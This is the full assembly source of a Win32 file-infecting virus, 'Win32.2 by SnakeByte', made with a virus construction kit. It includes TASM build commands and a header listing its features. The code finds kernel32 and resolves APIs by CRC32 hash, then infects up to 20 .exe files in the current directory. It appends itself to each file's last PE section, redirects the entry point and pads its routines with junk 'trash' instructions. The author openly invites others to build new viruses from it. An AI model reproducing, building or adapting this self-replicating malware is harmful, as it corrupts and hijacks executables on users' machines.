              
;
;
; Win32.2 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.2
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 2
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 18
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 not ecx                                ; Trash
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, -2422d
 add edx, 2422d
 mov ecx, dword ptr [ebp+AlignReg2]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
 add ecx, ebx                           ; Trash
                                        ; store old EIP and ImageBase
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx

 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx

                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+Trash1]

 push ecx
 pop dword ptr [ebp+Trash2]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 dec ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov edi, esi
 push esi
 pop edi
                                        ; mov ecx, edi
                                        ; clear ecx
 mov ecx, 0
 add ecx, edi
LenCRC:
                                        ; add ecx, 1
 sub ecx, -1d
 cmp byte ptr [ecx], 0
 jne LenCRC
 sub ecx, edi
                                        ; mov esi, ecx
 mov esi, ecx
                                        ; add esi, 1
 add esi, 1d
 cld
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, -1
                                        ; mov eax, ebx
 mov eax, ebx
NextByteCRC:
                                        ; clear ecx
 mov ecx, 9451d
 sub ecx, 9451d
                                        ; clear edx
 mov edx, 0
 mov cl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 xor cl, bl
 mov bl, bh
 mov bh, al
 mov al, ah
 mov ah, 8
NextBitCRC:
 shr dx, 1
 rcr cx, 1
jnc NoCRC
 xor cx,08320h
 xor dx,0EDB8h
NoCRC:
 dec ah
jnz NextBitCRC
 xor ebx, ecx
 xor eax, edx
 dec esi
jnz NextByteCRC
 not eax
 not ebx
 mov ecx, eax
 rol ecx, 16d
 mov cx, bx
 push ecx
 pop dword ptr [ebp+APICRC32]
 mov dword ptr [ebp+Trash1], ebx        ; Trash
 popad
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 push dword ptr [ebp+WFD_nFileSizeHigh]
 sar eax, 5d                            ; Trash
 pop edx
 cmp edx, 0
 jne NoInfection
                                        ; check for minimum filesize
 lea edi, [ebp+WFD_nFileSizeLow]
 xchg edi, edx

 cmp dword ptr [edx], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov ecx, ebp
 add ecx, offset WFD_szFileName
 ror edx, 29d                           ; Trash

 push ecx
 or edx, 26053199d                      ; Trash
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea edi, [ebp+WFD_szFileName]
 xchg edi, eax


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear edi
 mov edi, 0
 xor edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; mov edx, 28246
 mov edx, 28246d
 test edx, edx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [edi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
                                        ; clear ecx
 mov ecx, -57883d
 add ecx, 57883d
 add ecx, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp ecx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ecx, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
                                        ; clear eax
 xor eax, eax
 test eax, eax
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], '2'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov ax, word ptr [ecx+16h]
 inc dword ptr [ebp+Trash1]             ; Trash
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov dx, word ptr [ecx+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear eax
 mov eax, 10121d
 sub eax, 10121d
 xor eax, dword ptr [ebp+Attributes]
 push eax
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea esi, [ebp+WFD_szFileName]

 push esi
 call dword ptr [ebp+XCreateFileA]
 dec ecx                                ; Trash

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz CloseFile
 xor ebx, ecx                           ; Trash
                                        ; clear eax
 and eax, 0
 push ecx
 push eax
 push eax
                                        ; mov ebx, 2
 mov ebx, ( 2d xor 8d )
 xor ebx, 8d
 not edx                                ; Trash
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 adc dword ptr [ebp+Trash1], 1638971    ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 mov eax, offset filemask
 add eax, ebp

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 test eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
 mov eax, 87595698d                     ; Trash
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ebx
 mov ebx, -38446d
 add ebx, 38446d
 xor ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [ebx+3Ch]
 add eax, ebx
                                        ; get File Alignment
 mov ecx, [eax+3Ch]
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], ecx
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 sar eax, 25d                           ; Trash
 call Align
                                        ; mov edx, -1
 mov edx, ( -1d xor 32d )
 xor edx, 32d
 and edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, esi
 add edi, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 mov esi, edi
                                        ; get last section
                                        ; clear ebx
 mov ebx, 41931d
 sub ebx, 41931d
 mov bx, word ptr [esi+06h]
 dec ebx
 imul ebx, ebx, 28h
                                        ; add edi, 120
 inc edi
 add edi, 119d
 add edi, ebx
 mov eax, dword ptr [esi+74h]
 add dword ptr [ebp+Trash1], ecx        ; Trash
 clc
 rcl eax, 3
 add edi, eax
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], edx
 mov eax, [edi+10h]
                                        ; mov edx, eax
                                        ; clear edx
 sub edx, edx
 add edx, eax
 add eax, [edi+14h]
 adc ecx, ebx                           ; Trash
 push eax
 push edx
 pop ebx
 add edi, 0Ch
 add ebx, [edi]
 sub edi, 0Ch
 push ebx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ebx
 mov ebx, [edi+10h]
 push ebx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [edi+10h], ebx
 sub dword ptr [ebp+Trash1], 134147     ; Trash
 pop ebx
 add ebx, VirusSize
 mov dword ptr [edi+08h], ebx
 mov ebx, dword ptr [edi+10h]
 add ebx, dword ptr [edi+0Ch]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [edi+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], '2'
                                        ; Append Virus
 pop edi
 lea esi, [ebp+Virus]

 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 dec edx
 sar eax, 15d                           ; Trash
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 rcl ebx, 20d                           ; Trash
 stc
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg edi, esi

 push edi
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 push 276d
 pop eax
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, edx


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 sub edx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg esi, ecx

 push esi
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 and word ptr [ebp+counter], 0h




 push dword ptr [ebp+NTableVA]
 pop ecx


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], 0
 add dword ptr [ebp+NTableTemp], ecx
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
                                        ; mov ecx, edx
 mov ecx, edx
                                        ; mov esi, edx
                                        ; clear esi
 xor esi, esi
 add esi, edx
 push esi
 push edi
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 push dword ptr [ebp+APICRC32]
 pop ebx
 sub ebx, dword ptr [edi]
 cmp ebx, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop esi
                                        ; clear ecx
 mov ecx, -43169d
 add ecx, 43169d
 xor ecx, dword ptr [ebp+NTableTemp]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1
 or edx, 7520648d                       ; Trash

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop ecx
 pop esi
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 sub ecx, 31176936d                     ; Trash
 add eax, dword ptr [ebp+OTableVA]
 neg ecx                                ; Trash
 push eax
 pop esi
                                        ; clear eax
 xor eax, eax
 mov ax, word ptr [esi]
 sal eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [eax]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 NTableVA    dd 0h
 Trash2      dd 0h

 APINames:
 dd 0797B49ECh           ; MapViewOfFile
 dd 068624A9Dh           ; CloseHandle
 dd 094524B42h           ; UnmapViewOfFile
 dd 0C200BE21h           ; FindClose
 dd 03C19E536h           ; SetFileAttributesA
 dd 0AA700106h           ; FindNextFileA
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 08C892DDFh           ; CreateFileA
 dd 0AE17EBEFh           ; FindFirstFileA

 KernelMZ    dd 0h
 filemask    db '*.eXE',0
 AlignReg1   dd 0h
 InfCounter  dd 0h
 KernelPE    dd 0h
 TempAPI     dd 0h
 NewSize     dd 0h
 OldBase     dd 400000h
 OldEIP      dd 0h
 NTableTemp  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Trash1      dd 0h
 FindHandle  dd 0h

 APIOffsets:
 XMapViewOfFile         dd 0h
 XCloseHandle           dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XSetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h

 AlignReg2   dd 0h
 OTableVA    dd 0h
 FileHandle  dd 0h
 ATableVA    dd 0h
 db 'Win32.2 of SnakeByte',0
 Attributes  dd 0h
 MapHandle   dd 0h
 APICRC32    dd 0h
 NewEIP      dd 0h
 counter     dw 0h
 MapAddress  dd 0h




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; mov edi, -1
 push -1d
 pop edi
 and edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ecx


                                        ; get Kernel by using hardcoded values
 mov ebx, 077e00000h
 call GetKernel32
 jnc GetApis
 mov ebx, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov ebx, 077f00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ecx
 and ecx, 0

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ecx]
 lea edx, [ebp+GetKernel32Exception]

 push edx
 push eax

                                        ; add ebx, 1
 inc ebx
GetKernelLoop:
                                        ; clear edx
 mov edx, 0
 dec ebx
 mov dx, word ptr [ebx+03ch]
 cmp dx,0f800h
 je GetKernelLoop
 cmp ebx, dword ptr [ebx+edx+34h]
 jnz GetKernelLoop
 push ebx
 pop dword ptr [ebp+KernelMZ]
                                        ; add ebx, 60
 dec ebx
 add ebx, 61d
 mov eax, [ebx]
 inc ebx
 sub ebx, 61d
 add eax, ebx
 mov [KernelPE+ebp], eax
                                        ; clear esi
 push 0
 pop esi
 add esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear eax
 xor eax, eax
 add eax, [esi+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 dec eax
 add eax, 29d
                                        ; get ATableVA
 mov esi, dword ptr [eax]
                                        ; add eax, 4
 inc eax
 add eax, 3d
 add ebx, 95947607d                     ; Trash
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        ; get NTableVA
 mov esi, dword ptr [eax]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        ; add eax, 4
 add eax, 4d
                                        ; get OTableVA
 mov esi, dword ptr [eax]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
                                        ; clear edi
 mov edi, 0

 pop dword ptr fs:[edi]
 pop eax
 popad
 adc ecx, ecx                           ; Trash
 clc
ret

GetKernel32Exception:
                                        ; clear edx
 and edx, 0

 mov eax, dword ptr fs:[edx]
 mov esp, dword ptr [eax]
GetKernel32NotFound:
                                        ; clear edi
 mov edi, 28715d
 sub edi, 28715d

 pop dword ptr fs:[edi]
 pop ecx
 popad
 stc
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 mov ecx, ebp
 add ecx, offset APIOffsets

 lea edi, [ebp+APINames]


GetApisLoop: 

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; ecx points to the offset

 call SearchAPI1
                                        ; add edi, 4
 add edi, 4d
 mov eax, dword ptr [ebp+TempAPI]
 mov dword ptr [ecx], 0
 add dword ptr [ecx], eax
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 dec ebx
 jnz GetApisLoop
 jmp Outbreak



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear eax
 push 0
 pop eax
 push eax
 call ExitProcess



end FakeCode

